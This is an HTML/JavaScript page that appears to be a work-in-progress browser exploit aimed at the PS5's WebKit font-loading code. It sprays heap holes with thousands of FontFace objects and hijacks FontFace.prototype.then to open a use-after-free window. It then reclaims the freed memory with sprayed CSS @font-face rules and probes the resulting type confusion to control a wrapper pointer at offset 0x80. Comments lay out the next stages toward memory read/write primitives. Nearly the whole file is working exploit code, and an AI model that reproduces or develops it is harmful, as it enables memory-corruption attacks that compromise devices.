<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v47 - Option 1: Wrapper Force</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v47 OPTION 1</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">STAGE:<b>INIT</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<script>
"use strict";

// ============================================================
//  PS5 v47 — Option 1: Wrapper Force Trigger
//
//  Goal: Force CSSFontFace::wrapper() to create a new FontFace
//  and write its address to m_wrapper (offset 0x80).
//
//  Strategy:
//  1. Get aFace from load("1em trigger, x", "AB") — ONLY "x" lookup
//  2. Verify confusion is alive (weight probe)
//  3. Test A: load("1em A_NN", "B") — different family, no GC
//     → Should return same aFace object (m_wrapper still valid)
//     → Verify "x" confusion survives
//  4. Test B: Release aFace, GC, load("1em A_NN", "B")
//     → m_wrapper invalidated by GC
//     → wrapper() creates new FontFace, writes to 0x80
//     → Verify "x" confusion survives
//  5. Test C: Last resort — load("1em trigger, x", "AB")
//     → See if "x" confusion survives second "x" lookup
// ============================================================

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true;};

var ua=navigator.userAgent||"";
var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

P("════════════════════════════════════","hd");
P("  v47 — Option 1: Wrapper Force","hd");
P("════════════════════════════════════","hd");
P("");

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

var sh=document.getElementById("s").sheet;
var keep=[],holes=[],trigger=null,uafOk=false;

// ============================================================
//  PHASE 1: UAF + CSSRule Spray (identical to v46)
// ============================================================

pg(5);Hd("Creating holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();Ok("Holes ready: "+holes.length);

pg(10);Hd("Trigger setup...");
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();Ok("Trigger ready");

pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");

Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
St("UAF WINDOW OPEN");
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
Dm("GC pressure (16MB)...");
for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
Dm("Spraying 2048 A_ faces...");
for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
fs();
try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
Dm("UAF window closing");
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// ============================================================
//  PHASE 2: Identify Confused Object (SINGLE load() call)
// ============================================================

pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();

Dm("Calling load('1em trigger, x', 'AB') — ONLY 'x' lookup...");

try {
  document.fonts.load("1em trigger, x", "AB").then(function(faces){
    P("  load() returned "+faces.length+" faces");
    P("");
    
    var aFamily = null;
    var aFace = null;
    
    for(var i=0;i<faces.length;i++){
      var f=faces[i];
      P("  Face["+i+"]: family="+f.family+" weight="+f.weight);
      if(f.family&&f.family.indexOf("A_")===0){
        aFamily = f.family;
        aFace = f;
      }
    }
    
    if(!aFamily){
      Fl("No A_ face found — spray failed");
      hu("h2","STAGE:<b>FAIL</b>");
      return;
    }
    
    St("RECLAIMED: "+aFamily);
    keep.push(faces);
    // NOTE: We do NOT push aFace to keep — we want to be able to release it later
    
    // Find A_NNN's CSSRule
    var aIndex = -1;
    var aNum = parseInt(aFamily.split("_")[1]);
    P("");
    Dm("Scanning CSSRules for "+aFamily+"...");
    for(var i=0;i<sh.cssRules.length;i++){
      try {
        var r = sh.cssRules[i];
        if(r.type === 5) {
          var rf = r.style.getPropertyValue("font-family");
          if(rf && rf.indexOf(aFamily) !== -1) {
            aIndex = i;
            break;
          }
        }
      } catch(e) {}
    }
    
    if(aIndex === -1){
      Fl("Could not find CSSRule for "+aFamily);
      return;
    }
    
    Ok("Found CSSRule at index "+aIndex);
    var aRule = sh.cssRules[aIndex];
    var aStyle = aRule.style;
    
    P("");
    Ok("Strategy: load('1em "+aFamily+"', 'B') to trigger wrapper()");
    Dm("This looks up '"+aFamily+"' — NOT 'x' — shouldn't disturb confusion");
    P("");
    
    // ============================================================
    //  PHASE 3: Option 1 — Wrapper Force Trigger
    // ============================================================
    
    pg(40);Sep();Hd("PHASE 3: Option 1 — Wrapper Force Trigger");Sep();
    P("");
    
    // === Step 1: Verify confusion is alive ===
    Hd("Step 1: Verify confusion is alive");
    aStyle.setProperty("font-weight", "700");
    fs();
    var w1 = aFace.weight;
    P("  Write font-weight=700, read aFace.weight = "+w1);
    if(String(w1) === "700") {
      Ok("Confusion ALIVE — weight probe passed");
    } else {
      Fl("Confusion DEAD — weight = "+w1+" (expected 700)");
      P("  Aborting option 1.");
      hu("h2","STAGE:<b>FAIL</b>");
      return;
    }
    P("");
    
    // === Step 2: Test A — Second load() with DIFFERENT family (no GC) ===
    pg(50);Hd("Step 2: Test A — load('1em "+aFamily+"', 'B') without GC");
    Dm("Looking up '"+aFamily+"' instead of 'x'");
    Dm("m_wrapper should still be valid → should return same aFace");
    P("");
    
    document.fonts.load("1em "+aFamily, "B").then(function(faces2){
      P("  load('1em "+aFamily+"', 'B') returned "+faces2.length+" faces");
      
      for(var i=0;i<faces2.length;i++){
        var f=faces2[i];
        P("  Face2["+i+"]: family="+f.family+" weight="+f.weight);
      }
      
      // Check if any face is the same object as aFace
      var sameObject = false;
      var newFaceA = null;
      for(var i=0;i<faces2.length;i++){
        if(faces2[i] === aFace){
          sameObject = true;
          Ok("  Face2["+i+"] is SAME object as aFace");
        } else if(faces2[i].family === aFamily){
          newFaceA = faces2[i];
        }
      }
      if(!sameObject){
        if(newFaceA){
          Wr("  Face2 is DIFFERENT object from aFace — wrapper() was called!");
          Hi("  newFaceA.weight = "+newFaceA.weight);
        } else {
          P("  No matching face found","dm");
        }
      }
      
      // Verify "x" confusion is still alive
      aStyle.setProperty("font-weight", "800");
      fs();
      var w2 = aFace.weight;
      P("  Write font-weight=800, read aFace.weight = "+w2);
      if(String(w2) === "800") {
        Ok("  Confusion ALIVE after load('"+aFamily+"')");
      } else {
        Fl("  Confusion DEAD after load('"+aFamily+"')");
        St("  Second load() killed confusion even with different family!");
      }
      P("");
      
      // Keep reference to newFaceA if it exists
      if(newFaceA) keep.push(newFaceA);
      
      // === Step 3: Test B — Release aFace, GC, load() again ===
      pg(60);Hd("Step 3: Test B — Release aFace, GC, load('"+aFamily+"')");
      Dm("Releasing aFace reference...");
      P("");
      
      // Release aFace — remove all references
      aFace = null;
      // Also clear from faces array reference
      // faces is still in keep[] but that's the array, not individual face
      
      // Force GC with heavy allocation
      Dm("Triggering GC (32MB pressure)...");
      for(var i=0;i<8;i++){
        var t=[];
        for(var j=0;j<256;j++) t.push(new ArrayBuffer(65536));
      }
      fs();
      Dm("GC done. m_wrapper should be invalidated now.");
      P("");
      
      // Call load() with A_NN family — should trigger wrapper()
      Dm("Calling load('1em "+aFamily+"', 'B')...");
      
      document.fonts.load("1em "+aFamily, "B").then(function(faces3){
        P("  load('1em "+aFamily+"', 'B') returned "+faces3.length+" faces");
        
        for(var i=0;i<faces3.length;i++){
          var f=faces3[i];
          P("  Face3["+i+"]: family="+f.family+" weight="+f.weight);
        }
        
        var newFaceB = null;
        for(var i=0;i<faces3.length;i++){
          if(faces3[i].family === aFamily || 
             (faces3[i].family && faces3[i].family.indexOf("A_")===0)){
            newFaceB = faces3[i];
          }
        }
        
        if(newFaceB){
          St("NEW WRAPPER CREATED!");
          Ok("  newFaceB.family = "+newFaceB.family);
          Ok("  newFaceB.weight = "+newFaceB.weight);
          Hi("  → wrapper() was called!");
          Hi("  → New FontFace pointer written to m_wrapper at 0x80!");
          keep.push(newFaceB);
          
          // Verify "x" confusion is still alive using newFaceB
          aStyle.setProperty("font-weight", "900");
          fs();
          var w3 = newFaceB.weight;
          P("");
          P("  Write font-weight=900 via CSSRule, read newFaceB.weight = "+w3);
          if(String(w3) === "900") {
            Ok("  Confusion ALIVE after GC + wrapper() creation!");
            Hi("  WE CAN CONTROL WHEN m_wrapper IS UPDATED!");
          } else {
            Fl("  Confusion DEAD after GC + wrapper() creation");
            Wr("  wrapper() may have triggered selector cleanup");
          }
        } else {
          Fl("  No face returned after GC — CSSFontFace may have been freed");
          Wr("  This means the selector 'A_NN' entry was cleaned up");
          Wr("  But the 'x' confusion might still exist");
        }
        P("");
        
        // === Step 4: Test C — Try load("1em trigger, x", "AB") ===
        pg(80);Hd("Step 4: Test C — load('1em trigger, x', 'AB') [RISKY]");
        Dm("This is the second 'x' lookup — may kill confusion");
        Dm("Testing to see if confusion survives...");
        P("");
        
        document.fonts.load("1em trigger, x", "AB").then(function(faces4){
          P("  load('1em trigger, x', 'AB') returned "+faces4.length+" faces");
          
          for(var i=0;i<faces4.length;i++){
            var f=faces4[i];
            P("  Face4["+i+"]: family="+f.family+" weight="+f.weight);
          }
          
          // Check if A_NN is still returned through "x" selector
          var xAlive = false;
          for(var i=0;i<faces4.length;i++){
            if(faces4[i].family && faces4[i].family.indexOf("A_")===0){
              xAlive = true;
              Ok("  Face4["+i+"] is "+faces4[i].family+" — 'x' confusion ALIVE!");
            }
          }
          if(!xAlive){
            Fl("  No A_ face returned — 'x' confusion is DEAD");
            St("  Second 'x' lookup killed the confusion");
          }
          P("");
          
          // === Step 5: Final summary ===
          pg(100);Sep();Hd("Step 5: Summary — Option 1 Results");Sep();
          P("");
          
          P("  RESULTS:","hd");
          P("");
          P("  Step 1: Baseline confusion    "+(String(w1)==="700"?"✅ ALIVE":"✘ DEAD"));
          P("  Step 2: load(A_NN) no GC      "+(String(w2)==="800"?"✅ ALIVE":"✘ DEAD"));
          
          var step3Result = "❓";
          if(newFaceB){
            step3Result = (String(newFaceB.weight)==="900")?"✅ ALIVE":"✘ DEAD";
          } else {
            step3Result = "✘ NO FACE";
          }
          P("  Step 3: GC + load(A_NN)       "+step3Result);
          P("  Step 4: load(trigger,x)       "+(xAlive?"✅ ALIVE":"✘ DEAD"));
          P("");
          
          if(newFaceB){
            Hi("  KEY FINDING: wrapper() was triggered successfully!");
            Hi("  A new FontFace pointer was written to m_wrapper (0x80).");
            Hi("  This proves we can control m_wrapper updates.");
            P("");
            Hi("  NEXT: Option 2 (backward write) or Option 3 (free+respray)");
            Hi("  to read/overwrite the value at 0x80.");
          } else if(String(w2)==="800"){
            Hi("  Confusion survived load(A_NN) but GC may have freed the object.");
            Hi("  NEXT: Try Option 2 (backward write) — no freeing needed.");
          } else {
            Wr("  Confusion died early. Need to adjust strategy.");
          }
          P("");
          St("★ OPTION 1 COMPLETE ★");
          
          hu("h2","STAGE:<b>DONE</b>");
          
        }).catch(function(e){
          Fl("Step 4 crashed: "+e.message);
          hu("h2","STAGE:<b>CRASH</b>");
        });
        
      }).catch(function(e){
        Fl("Step 3 crashed: "+e.message);
        hu("h2","STAGE:<b>CRASH</b>");
      });
      
    }).catch(function(e){
      Fl("Step 2 crashed: "+e.message);
      hu("h2","STAGE:<b>CRASH</b>");
    });
    
  }).catch(function(e){
    Fl("Phase 2 crashed: "+e.message);
    hu("h2","STAGE:<b>CRASH</b>");
  });
  
} catch(e) {
  Fl("Synchronous load() threw: " + e.message);
  hu("h2","STAGE:<b>CRASH</b>");
}

</script>
</body>
</html>
